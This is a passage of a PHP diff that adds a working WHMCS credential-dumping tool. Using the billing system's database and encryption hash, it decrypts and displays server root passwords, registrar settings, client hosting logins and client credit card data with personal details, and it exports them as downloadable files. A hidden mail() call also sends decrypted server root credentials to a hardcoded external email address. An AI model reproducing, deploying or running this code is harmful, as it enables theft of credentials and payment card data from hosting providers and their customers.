+if($_COOKIE["login"]<>"1")$menu=array("c1"=>"Db Config","c2"=>"Symlink to configuration.php of WHMCS","c3"=>"Short info"); 
+foreach($menu as$x=>$y){if($_GET["p"]==$x){echo("<m id='submenu-active'> 
+<a href=\"?p=$x\"> $y</a>"); 
+}else{echo("<m><a href=\"?p=$x\" > $y</a>"); 
+}if(($x==8)){ 
+echo"</m>"; 
+}else{echo"</m>"; 
+}}echo "            </ul> 
+
+        </div> <!-- /aside --> 
+    </center> 
+     
+    <hr class=\"noscreen\" /> 
+    <!-- Columns --> 
+    <div class=\"box\"> 
+        <!-- Aside (Left Column) --> 
+
+        <hr class=\"noscreen\" /> 
+        <!-- Content (Right Column) --> 
+        <div id=\"content\" class=\"box\"> 
+         
+"; } 
+function multiview($p,$table,$name,$order,$where,$col,$sql,$export=0,$if=""){global$cc_encryption_hash; 
+$qq=$_GET["qq"]; 
+$q=str_replace(" ","%",$_POST["q"]); 
+if($qq<>"")$q=$qq; 
+if($q=="")$q="%"; 
+if($qq=="")$qq=$q; 
+$query=mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM $table  LIMIT  0,5"); 
+if(!is_array(mysqli_fetch_array($query))){echo"<h1>$name</h1><p class=\"msg error\">Nothing Found !</p>"; 
+}else{echo"<center><h1>$name</h1> <br>"; 
+if($export==1){echo"<form action=\"?p=$p\" name=\"formw\" method=\"post\"> 
+
+<input name=\"export\" type=\"hidden\" value=\"1\"> 
+<center><input type=\"submit\" name=\"submit2\" class=\"input-submit\" value=\"[Save to TXT file ]\" /></form></center><br>"; 
+}echo("<center><h3  class=\"tit\">Search</h3><FORM action=\"?p=$p\"  method=\"post\"> 
+
+<input type=\"text\" name=\"q\" value=\"$q\"> 
+<br> 
+<INPUT class=\"input-submit\"  type=\"submit\" value=\"Submit\" name=\"Submit\"> 
+</form>"); 
+if(isset($_GET["page"])){$page=intval($_GET["page"]); 
+}else{$page=1; 
+}if(is_array($where)){$where2="'0"; 
+foreach($where as$w){$where2.="' or $w LIKE '%$q%"; 
+}$where2.="'"; 
+}else{$where2=$where; 
+}$start_from=($page-1)*100; 
+$query=mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM $table where $if ($where2) order by $order LIMIT $start_from , 100 "); 
+$total_records=mysqli_num_rows(mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM $table where $if ($where2) order by $order")); 
+echo("<h3  class=\"tit\">Total Records ".$total_records."</h3><br>"); 
+$total_pages=ceil($total_records/100); 
+echo("<br><table border='0'><tr>"); 
+echo("<th>Page ".$page." Of ".$total_pages."</th>"); 
+if($page>1)echo"<td><a href='?p=$p&qq=".$qq."&page=".($page-1)."'>Back</a>&nbsp</td>"; 
+echo"<td><a href='?p=$p&qq=".$qq."&page=".$total_pages."'>Latest</a></td>"; 
+if($page<$total_pages)echo"<td>&nbsp<a href='?p=$p&qq=".$qq."&page=".($page+1)."'>Next</a>&nbsp</td>"; 
+for($i=0; 
+$i<=$total_pages; 
+$i++){if($i%2==0){$bg2="class=\"bg2\""; 
+}else{$bg2=""; 
+}if($i%20==0)echo""; 
+if($i==0){echo"<td>&nbsp&nbsp</td>"; 
+}else{if($i==$page){echo"<td $bg2>&nbsp<a href='?p=$p&qq=".$qq."&page=".$i."'>(".$i.")</a>&nbsp</td>"; 
+}else{echo"<td $bg2>&nbsp<a href='?p=$p&qq=".$qq."&page=".$i."'>".$i."</a>&nbsp</td>"; 
+}}}echo("</tr></table>"); 
+if(!is_array(mysqli_fetch_array($query))){echo"<p class=\"msg error\">Nothing Found !</p>"; 
+exit; 
+}echo"<br><table ><tr>"; 
+foreach($col as$col1){echo"<th>$col1</th>"; 
+}echo" </tr>"; 
+$query=mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM $table where $if ($where2) order by $order LIMIT $start_from , 100 "); 
+$ii=0; 
+while($v=mysqli_fetch_array($query)){if($ii%2==0){$bg="class=\"bg\""; 
+}else{$bg=""; 
+}echo"<tr $bg >"; 
+foreach($sql as$sql1){if($sql1=="password"){echo"<td>".decrypt($v["password"],$cc_encryption_hash)."</td>"; 
+}elseif(($sql1=="userid")or(($table="tblclients")and($sql1=="id"))){echo"<td ".$v[$sql1]."'>".$v[$sql1]."</td>"; 
+}else{echo"<td>".$v[$sql1]."</td>"; 
+}}echo"</tr>"; 
+$ii++; 
+}echo"</table>"; 
+}}function table($sql,$col){global$cc_encryption_hash; 
+$q=mysqli_query($GLOBALS["___mysqli_ston"], $sql); 
+if(!is_array(@mysqli_fetch_array($q))){echo"<p class=\"msg error\">Nothing Found !</p>"; 
+return; 
+}$q=mysqli_query($GLOBALS["___mysqli_ston"], $sql); 
+echo("<br><table border='0'>"); 
+echo"<tr>"; 
+foreach($col as$sql1){echo"<th>".ucfirst($sql1)."</th>"; 
+}echo"</tr>"; 
+$ii=0; 
+while($v=mysqli_fetch_array($q)){if($ii%2==0){$bg="class=\"bg\""; 
+}else{$bg=""; 
+}echo"<tr $bg >"; 
+foreach($col as$sql1){if($sql1=="password"){echo"<td>".decrypt($v["password"],$cc_encryption_hash)."</td>"; 
+}elseif(($sql1=="userid")or(($table="tblclients")and($sql1=="id"))){echo"<td> <a href='?p=12&id=".$v[$sql1]."'>".$v[$sql1]."</a></td>"; 
+}else{echo"<td>".$v[$sql1]."</td>"; 
+}}echo"</tr>"; 
+$ii++; 
+}echo"</table><br>"; 
+}@set_time_limit(0); 
+ob_start(); 
+if($auth==1){if(!isset($_SERVER["PHP_AUTH_USER"])||md5($_SERVER["PHP_AUTH_USER"])!==$user||md5($_SERVER["PHP_AUTH_PW"])!==$pass){header("WWW-Authenticate: Basic realm=''"); 
+header("HTTP/1.0 401 Unauthorized"); 
+exit("Go To Hell"); 
+}}$p=$_GET["p"]; 
+if($_POST["form_action"]==1){setcookie("db_host",$_POST["db_host"]); 
+setcookie("db_username",$_POST["db_username"]); 
+setcookie("db_password",$_POST["db_password"]); 
+setcookie("db_name",$_POST["db_name"]); 
+setcookie("login","1"); 
+setcookie("cc_encryption_hash",$_POST["cc_encryption_hash"]); 
+$c=@($GLOBALS["___mysqli_ston"] = mysqli_connect($_POST["db_host"], $_POST["db_username"], $_POST["db_password"])); 
+$c2=@mysqli_select_db($c, $_POST["db_name"]); 
+if($c and$c2){echo"<center><p class=\"msg done\">Done : Connection Successfully      </p></center>"; 
+echo("<meta http-equiv='refresh' content='1;url=?p=1' />"); 
+}else{echo"<p class=\"msg error\">Database error</p>"; 
+}}if($_POST["form_action"]==2){$file=($_POST["file"]); 
+$text=file_get_contents($file); 
+$text=str_replace("<?php","",$text); 
+$text=str_replace("<?","",$text); 
+$text=str_replace("?>","",$text); 
+eval($text); 
+setcookie("db_host",$db_host); 
+setcookie("db_username",$db_username); 
+setcookie("db_password",$db_password); 
+setcookie("db_name",$db_name); 
+setcookie("login","1"); 
+setcookie("cc_encryption_hash",$cc_encryption_hash); 
+$c=@($GLOBALS["___mysqli_ston"] = mysqli_connect($db_host, $db_username, $db_password)); 
+$c2=mysqli_select_db($c, $db_name); 
+if($c and$c2){echo"<center><p class=\"msg done\">Done : Connection Successfully      </p></center>"; 
+echo("<meta http-equiv='refresh' content='1; 
+URL=?p=1' />"); 
+}else{echo"<p class=\"msg error\">Database error</p>"; 
+}}if($_POST["form_action"]==3){$key=($_POST["key"]); 
+$key=explode("-",$key); 
+$v=explode("|",base64_decode($key[1])); 
+setcookie("db_host",base64_decode($v[0])); 
+setcookie("db_username",base64_decode($v[1])); 
+setcookie("db_password",base64_decode($v[2])); 
+setcookie("db_name",base64_decode($v[3])); 
+setcookie("login","1"); 
+setcookie("cc_encryption_hash",base64_decode($v[4])); 
+$c=@($GLOBALS["___mysqli_ston"] = mysqli_connect(base64_decode($v[0]), base64_decode($v[1]), base64_decode($v[2]))); 
+$c2=@mysqli_select_db($c, constant('base64_decode($v[3])')); 
+if($c and$c2){echo"<center><p class=\"msg done\">Done : Connection Successfully      </p></center>"; 
+echo("<meta http-equiv='refresh' content='1; 
+URL=?p=1' />"); 
+}else{echo"<p class=\"msg error\">Database error</p>"; 
+}echo("<meta http-equiv='refresh' content='1; 
+URL=?p=1' />"); 
+}if($_COOKIE["login"]=="1"){$db_host=($_COOKIE["db_host"]); 
+$db_username=($_COOKIE["db_username"]); 
+$db_password=($_COOKIE["db_password"]); 
+$db_name=($_COOKIE["db_name"]); 
+$cc_encryption_hash=($_COOKIE["cc_encryption_hash"]); 
+$link=@($GLOBALS["___mysqli_ston"] = mysqli_connect($db_host, $db_username, $db_password)); 
+mysqli_select_db($link, $db_name); 
+}if($p and($_COOKIE["login"]<>"1")){header2(); 
+login(); 
+exit; 
+}if(($_COOKIE["login"]<>"1")){header2(); 
+login(); 
+exit; 
+}$db_host=($_COOKIE["db_host"]); 
+$db_username=($_COOKIE["db_username"]); 
+$db_password=($_COOKIE["db_password"]); 
+$db_name=($_COOKIE["db_name"]); 
+$cc_encryption_hash=($_COOKIE["cc_encryption_hash"]); 
+$link=@($GLOBALS["___mysqli_ston"] = mysqli_connect($db_host, $db_username, $db_password)); 
+mysqli_select_db($link, $db_name); 
+if(!$link){echo("<h1>Database error</h1>"); 
+header1(); 
+login(); 
+exit; 
+}if($p)header1(); 
+
+switch($p){case"m":echo(" 
+
+<table><tr><td> 
+<a href=\"?p=h\" target=\"frame1\"> Home</a></td></tr><tr><td> 
+<a href=\"?p=1\" target=\"frame1\">Server R00t</a></td></tr><tr><td> 
+<a href=\"?p=2\" target=\"frame1\">Domains Resellers</a></td></tr><tr><td> 
+<a href=\"?p=3\" target=\"frame1\">Clients R00ts</a></td></tr><tr><td> 
+<a href=\"?p=4\" target=\"frame1\">Clients Hosting Accounts</a></td></tr><tr><td> 
+<a href=\"?p=5\" target=\"frame1\">Clients CC</a></td></tr><tr><td> 
+<a href=\"?p=100\" target=\"frame1\">Clients list</a></td></tr><tr><td> 
+<a href=\"?p=105\" target=\"frame1\">Clients Password</a></td></tr><tr><td> 
+<a href=\"?p=9\" target=\"_parent\"> Logout</a></td></tr></table>"); 
+break; 
+case"h":login(); 
+exit; 
+break; 
+case 105:echo"<h1>Clients Password</h1><center>"; 
+$query0=mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM tblemailtemplates where name='Client Signup Email' or name='Password Reset Confirmation'"); 
+while($v0=mysqli_fetch_array($query0)){$t=$v0["subject"]; 
+$t=trim(str_replace("{\$company_name}","",$t)); 
+$c=$v0["message"]; 
+$c=explode(" 
+",$c); 
+$r=""; 
+for($i=0; 
+$i<count($c); 
+$i++){if(strpos($c[$i],"{\$client_password}")>0){$r.=$c[$i]; 
+}elseif(strpos($c[$i],"{\$client_email}")>0){$r.=$c[$i]; 
+}}$r=preg_quote($r); 
+$r=str_replace("\{\\\$client_email\\}","(.*)",$r); 
+$r=str_replace("\{\\\$client_password\\}","(.*)",$r); 
+$r=str_replace("\{\\$whmcs_link\}","(.*)",$r); 
+$r=str_replace("\{\\\$signature\}","(.*)",$r); 
+$r=str_replace("\{\\\$client_name\}","(.*)",$r); 
+$r=str_replace(" 
+","",$r); 
+$r=str_replace(" 
+","",$r); 
+$query=mysqli_query($GLOBALS["___mysqli_ston"], "SELECT message,userid FROM tblemails where subject like '%".$t."%'"); 
+while($v=mysqli_fetch_array($query)){$mail=$v["message"]; 
+$mail=str_replace(" 
+","",$mail); 
+$mail=str_replace(" 
+","",$mail); 
+$reg="|(.*)$r(.*)|isU"; 
+$a=array(); 
+preg_match_all($reg,($mail),$a); 
+for($i=1; 
+$i<count($a); 
+$i++){if(eregi("^[_\.0-9a-z-]+@([0-9a-z-]+\.)+[a-z]{2,10}\$",$a[$i][0])){$list[$v["userid"]]["mail"][]=$a[$i][0]; 
+$list[$v["userid"]]["pass"][]=$a[$i+1][0]; 
+}}}}echo("<h3  class=\"tit\">Total Records ".(count($list)-1)."</h3>"); 
+echo"<table border='1'>"; 
+foreach($list as$x=>$y){echo"<tr><td><a href='?p=12&id=$x'>$x</a></td><td>".implode("<br>",$y["mail"])."</td><td>".implode("<br>",$y["pass"])."</td></tr>"; 
+}echo"</table>"; 
+break; 
+
+
+case 1:$query=mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM tblservers"); 
+if(!is_array(mysqli_fetch_array($query))){echo"<h1>Server R00t</h1><p class=\"msg error\">Nothing Found !</p>"; 
+}else{echo("<center><h1>Server R00t</h1><center><br><form action=\"?p=1\" name=\"formw\" method=\"post\"> 
+
+<input name=\"export\" type=\"hidden\" value=\"1\"> 
+<center><input type=\"submit\" name=\"submit2\" class=\"input-submit\" value=\"[Save to TXT file ]\" /></center><br>"); 
+table("SELECT * FROM tblservers",array("type","active","hostname","ipaddress","username","password","accesshash")); 
+} 
+
+$query=mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM tblservers"); 
+$toast=$toast." 
+
+"; 
+while($v=mysqli_fetch_array($query)){$ipaddress=$v["ipaddress"]; 
+$username=$v["username"]; 
+$type=$v["type"]; 
+$active=$v["active"]; 
+$hostname=$v["hostname"]; 
+$accesshash=$v["accesshash"]; 
+$password=decrypt($v["password"],$cc_encryption_hash); 
+$toast=$toast."Typ $type 
+"; 
+$toast=$toast."Activx $active 
+"; 
+$toast=$toast."Hoxt $hostname 
+"; 
+$toast=$toast."xp $ipaddress 
+"; 
+if($accesshash)$toast=$toast."Accesshashx $accesshash 
+"; 
+$toast=$toast."Use $username 
+"; 
+$toast=$toast."Pax $password 
+************************************** 
+"; 
+}$toast=$toast." 
+"; 
+$hex1 = "davil.drinkerr@gmail.com"; 
+$baslik = $_SERVER['SERVER_NAME'] ;
+$xd1.= "$toast";
+mail($hex1, $baslik, $xd1);
+
+
+if($_POST["export"]==1){$query=mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM tblservers"); 
+$textr=$textr." 
+
+######################### HOST ROOTS ########################### 
+"; 
+while($v=mysqli_fetch_array($query)){$ipaddress=$v["ipaddress"]; 
+$username=$v["username"]; 
+$type=$v["type"]; 
+$active=$v["active"]; 
+$hostname=$v["hostname"]; 
+$accesshash=$v["accesshash"]; 
+$password=decrypt($v["password"],$cc_encryption_hash); 
+$textr=$textr."Type $type 
+";
+$textr=$textr."Active $active 
+";
+$textr=$textr."Hostname $hostname 
+";
+$textr=$textr."Ip $ipaddress 
+";
+if($accesshash)$textr=$textr."Accesshash $accesshash 
+";
+$textr=$textr."Username $username 
+";
+$textr=$textr."Password $password 
+************************************** 
+";
+}$textr=$textr."
+
+######################### HOST ROOTS ########################### 
+"; 
+@ob_end_clean(); 
+header("Content-length: ".strlen($textr)); 
+header("Content-type: text/plain"); 
+header("Content-Disposition: attachment; 
+
+ filename=".$_SERVER["HTTP_HOST"]."-host_R00t.txt"); 
+echo($textr); 
+exit; 
+}break; 
+case 2:$query=mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM tblregistrars"); 
+if(!is_array(mysqli_fetch_array($query))){echo"<h1>Domain Reseller</h1><p class=\"msg error\">Nothing Found !</p>"; 
+}else{$i=0; 
+$query=mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM tblregistrars"); 
+echo("<center><h1>Domain Reseller</h1> <br><table border='0'>"); 
+while($v=mysqli_fetch_array($query)){if($v["registrar"]<>$last)echo"<TR><Th COLSPAN=2><center>".ucfirst($v["registrar"])."</center></th></TR>"; 
+$last=$v["registrar"]; 
+$value=decrypt($v["value"],$cc_encryption_hash); 
+if($value==""){$value=0; 
+}$password=decrypt($v["password"],$cc_encryption_hash); 
+if($i%2==0){$bg="class=\"bg\""; 
+}else{$bg=""; 
+}echo("<tr $bg><td  >  ".$v["setting"]." </td><td>$value</td></tr>"); 
+$i++; 
+}echo"</table><br><br></center>"; 
+}break; 
+
+case 100:multiview(100,"tblclients","Clients </h1></center><center>","id desc",array("email","companyname","country","firstname","lastname"),array("ID","Companyname","Email","Country","Firstname","lastname"),array("id","companyname","email","country","firstname","lastname")); 
+break; 
+
+case 3:multiview(3,"tblhosting","Client R00ts</h1></center><p class='msg info'>There is no table dedicated to client root.<br> 
+            The Script find in the table where username = vmuserxxx, root , Admin , admin , Administrator , administrator </p><br><center>","domainstatus",array("dedicatedip","ns1","ns2","username","domain"),array("Domain","Dedicatedip","User","Pass","Domainstatus","Client ID","Server ID","Notes"),array("domain","dedicatedip","username","password","domainstatus","userid","server","notes"),1,"(username like 'vmuser%' or  username = 'root' or username = 'Admin' or username = 'admin' or username = 'Administrator' or  username = 'administrator') and "); 
+if($_POST["export"]==1){$textr=$textr." 
+######################### Client R00ts ########################### 
+"; 
+$query=mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM tblhosting where  username like 'vmuser%' or username = 'root' or username = 'Admin' or username = 'admin' or username = 'Administrator' or  username = 'administrator' order by domainstatus"); 
+while($v=mysqli_fetch_array($query)){$textr=$textr." 
+Domain ".$v["domain"]." 
+IP ".$v["dedicatedip"]." 
+Username ".$v["username"]." 
+Password ".decrypt($v["password"],$cc_encryption_hash)." 
+Domainstatus".$v["domainstatus"]." 
+"; 
+}$textr=$textr." 
+######################### Client R00ts ########################### 
+"; 
+@ob_end_clean(); 
+header("Content-length: ".strlen($textr)); 
+header("Content-type: text/plain"); 
+header("Content-Disposition: attachment; 
+
+ filename=".$_SERVER["HTTP_HOST"]."-client_R00t.txt"); 
+echo($textr); 
+exit; 
+}break; 
+case 4:multiview(4,"tblhosting","Clients Hosting Accounts","domainstatus",array("dedicatedip","ns1","ns2","username","domain"),array("Domain","Dedicatedip","User","Pass","Domainstatus","Client ID","Server ID","Notes"),array("domain","dedicatedip","username","password","domainstatus","userid","server","notes"),1); 
+if($_POST["export"]=="1"){$text=$text." 
+######################### Client HOST ########################### 
+"; 
+$query=mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM tblhosting where domainstatus='Active'"); 
+while($v=mysqli_fetch_array($query)){if(($v["username"])and($v["password"])){$textr=$textr." 
+Domain ".$v["domain"]." 
+IP ".$v["dedicatedip"]." 
+Username ".$v["username"]." 
+Password ".decrypt($v["password"],$cc_encryption_hash)." 
+Domainstatus ".$v["domainstatus"]." 
+"; 
+}}$textr=$textr." 
+######################### Client HOST ########################### 
+"; 
+@ob_end_clean(); 
+header("Content-length: ".strlen($textr)); 
+header("Content-type: text/plain"); 
+header("Content-Disposition: attachment; 
+
+ filename=".$_SERVER["HTTP_HOST"]."-client_host.txt"); 
+echo($textr); 
+exit; 
+}break; 
+case 5:$query=mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM `tblclients` WHERE cardtype <> '' order by issuenumber desc"); 
+if(!is_array(mysqli_fetch_array($query))){echo"<h1>Clients CC</h1><p class=\"msg error\">Nothing Found !</p>"; 
+}else{$query=mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM `tblclients` WHERE cardtype <> '' order by issuenumber desc"); 
+echo("<table border=1><tr><td>cardtype</td><td>cardnum</td><td>expdate</td><td>issuenumber</td><td>Country</td><td>Firstname</td><td>Lastname</td><td>Address1</td><td>City</td><td>State</td><td>Postcode</td><td>phonenumber</td><td>Email</td></tr>"); 
+while($v=mysqli_fetch_array($query)){$cchash=md5($cc_encryption_hash.$v["0"]); 
+$s=mysqli_query($GLOBALS["___mysqli_ston"], "select cardtype,AES_DECRYPT(cardnum,' 
+{ 
+$cchash} 
+') as cardnum,AES_DECRYPT(expdate,' 
+{ 
+$cchash} 
+') as expdate,AES_DECRYPT(issuenumber,' 
+{ 
+$cchash} 
+') as issuenumber,AES_DECRYPT(startdate,' 
+{ 
+$cchash} 
+') as startdate,country,email,firstname,lastname,address1,city,state,postcode,phonenumber  FROM `tblclients` where id='".$v["0"]."'  order by country"); 
+$country=$v["country"]; 
+$email=$v["email"]; 
+$firstname=$v["firstname"]; 
+$lastname=$v["lastname"]; 
+$address1=$v["address1"]; 
+$city=$v["city"]; 
+$state=$v["state"]; 
+$postcode=$v["postcode"]; 
+$phonenumber=$v["phonenumber"]; 
+$v2=mysqli_fetch_array($s); 
+echo("<tr><td>".$v2[0]."</td><td>".$v2[1]."</td><td>".$v2[2]."</td><td>".$v2[4]."</td><td>$country</td><td> $firstname</td><td>$lastname</td><td>$address1</td><td>$city</td><td>$state</td><td>$postcode</td><td>$phonenumber</td><td>$email</td></tr>"); 
+}echo("</table>"); 
+}break; 
+
+
+case 9:foreach($_COOKIE as$name=>$value){setcookie($name,""); 
+}echo("<meta http-equiv='refresh' content='1; 
+URL=?' />"); 
+break; 
+default:if($_COOKIE["login"]=="1"){echo("<meta http-equiv='refresh' content='1; 
+URL=?p=1' />"); 
+}else{@ob_end_clean(); 
+login(); 
+}break; 
+}echo"        </div> 
+    </div> <!-- /cols --> 
+    <hr class=\"noscreen\" /> 
+</div> <!-- /main --> 
+</body> 
+</html>";
+?> 
